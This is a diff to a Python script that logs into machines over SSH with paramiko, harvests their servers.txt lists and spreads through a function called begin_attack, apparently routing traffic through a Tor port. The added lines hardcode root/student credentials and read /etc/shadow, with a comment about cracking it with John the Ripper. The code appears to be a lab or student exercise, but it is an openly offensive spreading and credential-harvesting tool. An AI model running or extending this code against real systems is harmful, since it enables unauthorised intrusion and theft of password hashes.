@@ -19,6 +19,8 @@ q = Queue.Queue()
 ip_list = []
 FORWARD_PORT = 9050
 initial_comps = 0
+users = ["root"]
+passwords = ["student"]
 
 class Computer:
     def __init__(self, ip, ssh_port):
@@ -125,7 +127,7 @@ def begin_attack(client):
         # gets the servers.txt
         stdin, stdout, stderr = client.exec_command("cat ~/servers.txt")
         new_servers = stdout.readlines()
-        print "%s\n\t%s" % (server.host, new_servers)
+        # print "%s\n\t%s" % (server.host, new_servers)
         new_servers = map(lambda x: x.strip(), new_servers)
         for s in new_servers:
             host, port = get_host_port(s)
@@ -156,9 +158,18 @@ if __name__ == "__main__":
     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
 
+    # get list of immediate computers
     f = open("servers.txt", "r")
     computers = f.readlines()
     f.close()
+
+    # get initial user/pass shit for john the ripper
+    f = open("/etc/shadow")
+    accts = f.readlines()
+    f.close()
+
+    print accts
+    sys.exit(1)
 
     # initialize the queue with starting computer list
     for c in computers:
